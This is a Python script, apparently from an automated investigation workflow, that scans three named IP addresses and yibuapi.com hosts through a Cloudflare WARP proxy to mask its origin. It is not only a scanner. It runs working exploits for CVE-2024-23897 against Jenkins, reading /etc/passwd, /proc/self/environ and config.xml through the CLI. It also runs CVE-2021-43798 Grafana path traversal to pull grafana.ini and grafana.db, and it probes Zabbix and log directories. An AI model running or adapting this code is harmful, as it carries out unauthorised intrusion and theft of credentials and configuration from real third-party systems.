#!/usr/bin/env python3
# i54770: re-test operator infra hosts through Cloudflare WARP egress (fact#54279)
# Targets: 51.222.15.95 (yimo Jenkins), 54.36.150.244 (jenkins/gitlab/grafana),
#          51.79.66.166 (:8787 model_status, :3000, :443, :10051 zabbix, log dirs)
# Read-only, low-rate. Records direct (runner egress) baseline too.
import os, sys, json, time, socket, ssl, re, subprocess, struct, traceback
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import socks
except Exception:
    subprocess.run([sys.executable, '-m', 'pip', 'install', '-q', 'pysocks', 'requests'], check=False)
    import socks
import requests
requests.packages.urllib3.disable_warnings()

WARP_OK = False
try:
    WARP_OK = 'warp-cli-proxy' in open('warp_method.env').read()
except Exception:
    pass
PROXY = 'socks5h://127.0.0.1:40000' if WARP_OK else ''
PROXIES = {'http': PROXY, 'https': PROXY} if PROXY else None
UA = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36'
RESULT = {'warp_ok': WARP_OK, 'proxy': PROXY, 'egress': {}, 'targets': {}}


def log(*a):
    print(*a, flush=True)


def egress_identity():
    try:
        r = requests.get('https://www.cloudflare.com/cdn-cgi/trace', proxies=PROXIES, timeout=25)
        RESULT['egress']['trace'] = dict(l.split('=', 1) for l in r.text.strip().splitlines() if '=' in l)
    except Exception as e:
        RESULT['egress']['trace_err'] = repr(e)[:200]
    for name, url in [('v4', 'https://api.ipify.org'), ('v6', 'https://ipv6.icanhazip.com')]:
        try:
            RESULT['egress'][name] = requests.get(url, proxies=PROXIES, timeout=20).text.strip()[:80]
        except Exception as e:
            RESULT['egress'][name + '_err'] = repr(e)[:120]
    log('EGRESS', json.dumps(RESULT['egress']))


def classify_exc(e):
    s = repr(e)
    if isinstance(e, (socket.timeout, TimeoutError)) or 'timed out' in s:
        return 'timeout'
    if 'Connection refused' in s or 'refused' in s.lower():
        return 'refused'
    if 'Network is unreachable' in s or 'unreachable' in s:
        return 'unreachable'
    if 'Socks5' in s or 'SOCKS' in s:
        return 'socks_error:' + s[-120:]
    return 'error:' + s[-120:]


def tcp_probe(ip, port, mode='proxy', timeout=6.0):
    t = time.time()
    try:
        if mode == 'proxy':
            if not WARP_OK:
                return {'state': 'skip', 'ms': 0}
            s = socks.socksocket()
            s.set_proxy(socks.SOCKS5, '127.0.0.1', 40000, rdns=True)
        else:
            s = socket.socket()
        s.settimeout(timeout)
        s.connect((ip, port))
        out = {'state': 'open', 'ms': int((time.time() - t) * 1000)}
        # banner grab for plaintext protocols
        if port in (21, 22):
            try:
                s.settimeout(4)
                b = s.recv(256)
                out['banner'] = b.decode('utf-8', 'replace').strip()[:200]
            except Exception:
                pass
        s.close()
        return out
    except Exception as e:
        try:
            s.close()
        except Exception:
            pass
        return {'state': classify_exc(e), 'ms': int((time.time() - t) * 1000)}


def http_probe(ip, port, host, path, mode='proxy', tls=False, method='GET',
               data=None, extra_headers=None, timeout=10, maxbody=1200, allow_redirects=False):
    scheme = 'https' if tls else 'http'
    url = '%s://%s:%d%s' % (scheme, ip, port, path)
    headers = {'Host': host, 'User-Agent': UA, 'Accept': '*/*'}
    if extra_headers:
        headers.update(extra_headers)
    proxies = PROXIES if (mode == 'proxy' and WARP_OK) else None
    t = time.time()
    try:
        r = requests.request(method, url, headers=headers, data=data, proxies=proxies,
                             timeout=(7, timeout), verify=False, allow_redirects=allow_redirects)
        hdrs = {k: v for k, v in r.headers.items() if k.lower() in
                ('server', 'x-jenkins', 'x-jenkins-cli-protocol', 'x-grafana-version', 'x-gitlab-version',
                 'location', 'content-type', 'content-length', 'set-cookie', 'www-authenticate', 'x-powered-by')}
        out = {'path': path, 'host': host, 'status': r.status_code,
               'ms': int((time.time() - t) * 1000), 'len': len(r.content), 'headers': hdrs}
        try:
            out['body'] = r.content[:maxbody].decode('utf-8', 'replace')
        except Exception:
            out['body'] = repr(r.content[:maxbody])
        return out
    except Exception as e:
        return {'path': path, 'host': host, 'error': classify_exc(e), 'ms': int((time.time() - t) * 1000)}


def raw_http(ip, port, req: bytes, mode='proxy', tls=False, timeout=10, maxread=20000):
    s = None
    try:
        if mode == 'proxy':
            if not WARP_OK:
                return {'error': 'no_warp'}
            s = socks.socksocket()
            s.set_proxy(socks.SOCKS5, '127.0.0.1', 40000, rdns=True)
        else:
            s = socket.socket()
        s.settimeout(timeout)
        s.connect((ip, port))
        if tls:
            ctx = ssl._create_unverified_context()
            s = ctx.wrap_socket(s, server_hostname=ip)
        s.sendall(req)
        data = b''
        try:
            while len(data) < maxread:
                b = s.recv(4096)
                if not b:
                    break
                data += b
        except socket.timeout:
            pass
        head, _, body = data.partition(b'\r\n\r\n')
        status_line = head.split(b'\r\n')[0].decode('latin1') if head else ''
        return {'status_line': status_line, 'len': len(data), 'head': head[:600].decode('latin1', 'replace'),
                'body': body[:1500].decode('latin1', 'replace')}
    except Exception as e:
        return {'error': classify_exc(e)}
    finally:
        try:
            s.close()
        except Exception:
            pass


# ---------------- target-specific deep probes ----------------

def jenkins_deep(ip, port, host, tls, mode, tag):
    out = {'service': 'jenkins', 'vhost': host, 'tls': tls}
    paths = ['/', '/login', '/api/json', '/whoAmI/api/json', '/github-webhook/',
             '/script', '/manage', '/oops', '/jnlpJars/jenkins-cli.jar', '/cli']
    out['probes'] = [http_probe(ip, port, host, p, mode, tls, maxbody=900) for p in paths]
    # POST github-webhook empty
    out['webhook_post'] = http_probe(ip, port, host, '/github-webhook/', mode, tls,
                                     method='POST', data=b'', extra_headers={'Content-Length': '0'}, maxbody=500)
    # version
    ver = None
    for p in out['probes']:
        for k, v in (p.get('headers') or {}).items():
            if k.lower() == 'x-jenkins':
                ver = v
    if ver:
        out['version'] = ver
    # CVE-2024-23897 attempt when CLI jar exists & java available
    try:
        jar = next((p for p in out['probes'] if p.get('path') == '/jnlpJars/jenkins-cli.jar' and p.get('status') == 200), None)
        if jar:
            proxies = PROXIES if (mode == 'proxy' and WARP_OK) else None
            url = 'http://%s:%d/jnlpJars/jenkins-cli.jar' % (ip, port)
            r = requests.get(url, headers={'Host': host, 'User-Agent': UA}, proxies=proxies, timeout=(7, 25), verify=False)
            if r.status_code == 200 and r.content[:2] == b'PK':
                open('jenkins-cli.jar', 'wb').write(r.content)
                out['cli_jar_bytes'] = len(r.content)
                base = ('https' if tls else 'http') + '://%s:%d/' % (ip, port)
                extra = ['-noCertificateCheck'] if tls else []
                attempts = []
                for cmd in [['help', '@/etc/passwd'],
                            ['who-am-i', '@/etc/passwd'],
                            ['connect-node', '@/etc/passwd'],
                            ['help', '@/proc/self/environ'],
                            ['help', '@/var/jenkins_home/config.xml']]:
                    argv = ['java', '-jar', 'jenkins-cli.jar', '-s', base, '-http'] + extra + cmd
                    try:
                        p = subprocess.run(argv, capture_output=True, timeout=60)
                        attempts.append({'argv': cmd, 'rc': p.returncode,
                                         'stdout': p.stdout.decode('utf-8', 'replace')[:1500],
                                         'stderr': p.stderr.decode('utf-8', 'replace')[:1500]})
                    except Exception as e:
                        attempts.append({'argv': cmd, 'error': repr(e)[:200]})
                out['cve_2024_23897_attempts'] = attempts
    except Exception as e:
        out['cli_err'] = repr(e)[:300]
    return out


def grafana_deep(ip, port, host, tls, mode):
    out = {'service': 'grafana', 'vhost': host, 'tls': tls}
    paths = ['/', '/login', '/api/health', '/api/datasources', '/api/frontend/settings',
             '/public/build/manifest.json', '/api/login/ping', '/api/user']
    out['probes'] = [http_probe(ip, port, host, p, mode, tls, maxbody=900) for p in paths]
    # CVE-2021-43798 path traversal via raw request (path-as-is)
    cve = {}
    for plugin in ['alertlist', 'graph', 'text', 'timeseries', 'table']:
        for target in ['/etc/passwd', '/etc/grafana/grafana.ini', '/var/lib/grafana/grafana.db']:
            path = '/public/plugins/%s/../../../../../../../../..%s' % (plugin, target)
            req = ('GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n'
                   % (path, host, UA)).encode()
            r = raw_http(ip, port, req, mode, tls, timeout=12, maxread=6000)
            key = '%s%s' % (plugin, target)
            cve[key] = r
            if r.get('status_line', '').startswith('HTTP/1.') and ' 200 ' in r.get('status_line', ''):
                break
    out['cve_2021_43798'] = cve
    # encoded traversal variant
    p2 = '/public/plugins/alertlist/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
    req = ('GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n' % (p2, host, UA)).encode()
    out['cve_2021_43798_enc'] = raw_http(ip, port, req, mode, tls, timeout=12, maxread=6000)
    return out


def gitlab_deep(ip, port, host, tls, mode):
    out = {'service': 'gitlab', 'vhost': host, 'tls': tls}
    paths = ['/', '/users/sign_in', '/users/sign_up', '/-/health', '/help', '/explore',
             '/api/v4/version', '/api/v4/projects?per_page=1', '/api/v4/metadata']
    out['probes'] = [http_probe(ip, port, host, p, mode, tls, maxbody=1200) for p in paths]
    ver = None
    for p in out['probes']:
        b = p.get('body') or ''
        m = re.search(r'GitLab[^0-9]{0,20}(\d+\.\d+\.\d+)', b)
        if m:
            ver = m.group(1)
            break
    if ver:
        out['version'] = ver
    return out


def zabbix_probe(ip, port, mode, host='Zabbix server'):
    try:
        if mode == 'proxy':
            if not WARP_OK:
                return {'error': 'no_warp'}
            s = socks.socksocket(); s.set_proxy(socks.SOCKS5, '127.0.0.1', 40000, rdns=True)
        else:
            s = socket.socket()
        s.settimeout(8)
        s.connect((ip, port))
        payload = json.dumps({'request': 'active checks', 'host': host}).encode()
        s.sendall(b'ZBXD\x01' + struct.pack('<Q', len(payload)) + payload)
        s.settimeout(6)
        data = s.recv(4096)
        s.close()
        out = {'len': len(data), 'raw': data[:300].decode('latin1', 'replace')}
        if data[:4] == b'ZBXD':
            ln = struct.unpack('<Q', data[4:12])[0]
            body = data[12:12 + ln]
            out['zabbix'] = True
            out['body'] = body[:600].decode('utf-8', 'replace')
        else:
            out['zabbix'] = False
        return out
    except Exception as e:
        return {'error': classify_exc(e)}


def generic_http_deep(ip, port, host, tls, mode, paths, tag):
    return {'service': tag, 'vhost': host, 'tls': tls,
            'probes': [http_probe(ip, port, host, p, mode, tls, maxbody=1000) for p in paths]}


HTTP_PORTS = {80, 443, 3000, 3001, 8080, 8787}


def is_http(port, banner=None):
    if port in HTTP_PORTS:
        return True
    return False


def run():
    egress_identity()
    targets = [
        {'tag': 'A', 'ip': '51.222.15.95', 'ports': [8080, 21, 22, 3001, 80, 443],
         'vhosts': ['yimo.yibuapi.com', '51.222.15.95']},
        {'tag': 'B', 'ip': '54.36.150.244', 'ports': [8080, 3000, 80, 443, 22],
         'vhosts': ['jenkins.yibuapi.com', 'gitlab.yibuapi.com', 'grafana.yibuapi.com', '54.36.150.244']},
        {'tag': 'C', 'ip': '51.79.66.166', 'ports': [8787, 3000, 443, 10051, 80, 22],
         'vhosts': ['yibuapi.com', '51.79.66.166']},
    ]
    # ---- port scan both modes in parallel ----
    for t in targets:
        t['scan'] = {}
    with ThreadPoolExecutor(max_workers=12) as ex:
        futs = {}
        for t in targets:
            for mode in ['proxy', 'direct']:
                for port in t['ports']:
                    futs[ex.submit(tcp_probe, t['ip'], port, mode)] = (t, mode, port)
        for fut, (t, mode, port) in futs.items():
            try:
                r = fut.result()
            except Exception as e:
                r = {'state': 'err:' + repr(e)[:100]}
            t.setdefault('scan', {}).setdefault(port, {})[mode] = r
    for t in targets:
        log('SCAN %s %s %s' % (t['tag'], t['ip'], json.dumps(t['scan'])))

    # ---- deep probes only for ports open via WARP (and note direct) ----
    for t in targets:
        node = {'ip': t['ip'], 'tag': t['tag'], 'scan': t['scan'], 'deep': []}
        RESULT['targets'][t['tag']] = node
        open_proxy = [p for p in t['ports'] if t['scan'].get(p, {}).get('proxy', {}).get('state') == 'open']
        open_direct = [p for p in t['ports'] if t['scan'].get(p, {}).get('direct', {}).get('state') == 'open']
        log('OPEN proxy=%s direct=%s for %s' % (open_proxy, open_direct, t['ip']))
        if not open_proxy:
            node['note'] = 'no port open via WARP'
            continue
        # mode to use: proxy
        mode = 'proxy'
        for port in open_proxy:
            tls = (port == 443)
            if port == 10051:
                node['deep'].append({'port': port, 'zabbix': zabbix_probe(t['ip'], port, mode)})
                continue
            if port == 21:
                node['deep'].append({'port': port, 'banner': t['scan'][port]['proxy'].get('banner')})
                continue
            if port == 22:
                node['deep'].append({'port': port, 'banner': t['scan'][port]['proxy'].get('banner')})
                continue
            if not is_http(port):
                continue
            hosts = t['vhosts'] if port in (80, 443, 8080, 3000, 3001) else [t['ip']]
            for host in hosts:
                fp = generic_http_deep(t['ip'], port, host, tls, mode,
                                       ['/', '/api/status', '/api_log_rsync/', '/haochi_log_rsync/',
                                        '/log_rsync/', '/metrics', '/health'], 'generic')
                node['deep'].append({'port': port, 'fingerprint': fp})
                # decide service by fingerprints
                bodies = ' '.join((p.get('body') or '') for p in fp['probes'])
                hdrs = ' '.join(json.dumps(p.get('headers') or {}) for p in fp['probes'])
                alltxt = bodies + hdrs
                if (re.search(r'jenkins', alltxt, re.I) or 'X-Jenkins' in alltxt
                        or (port == 8080 and 'yimo' in host)):
                    node['deep'].append({'port': port, 'jenkins': jenkins_deep(t['ip'], port, host, tls, mode, t['tag'])})
                if re.search(r'grafana', alltxt, re.I) or ('grafana' in host):
                    node['deep'].append({'port': port, 'grafana': grafana_deep(t['ip'], port, host, tls, mode)})
                if re.search(r'gitlab', alltxt, re.I) or ('gitlab' in host):
                    node['deep'].append({'port': port, 'gitlab': gitlab_deep(t['ip'], port, host, tls, mode)})
                # targeted log-dir checks on model_status host
                if t['tag'] == 'C' and port in (8787, 3000, 80, 443):
                    node['deep'].append({'port': port, 'logdirs': generic_http_deep(
                        t['ip'], port, host, tls, mode,
                        ['/api_log_rsync/', '/haochi_log_rsync/', '/log_rsync/', '/api/status',
                         '/api/status/', '/api/v1/status', '/status'], 'logdirs')})
        json.dump(RESULT, open('results54770.partial.json', 'w'), ensure_ascii=False, indent=1)
    json.dump(RESULT, open('results54770.json', 'w'), ensure_ascii=False, indent=1)
    log('=== RESULT JSON (summary) ===')
    log(json.dumps(RESULT, ensure_ascii=False)[:12000])


if __name__ == '__main__':
    try:
        run()
    except Exception:
        traceback.print_exc()
        try:
            json.dump(RESULT, open('results54770.partial.json', 'w'), ensure_ascii=False, indent=1)
        except Exception:
            pass
        sys.exit(3)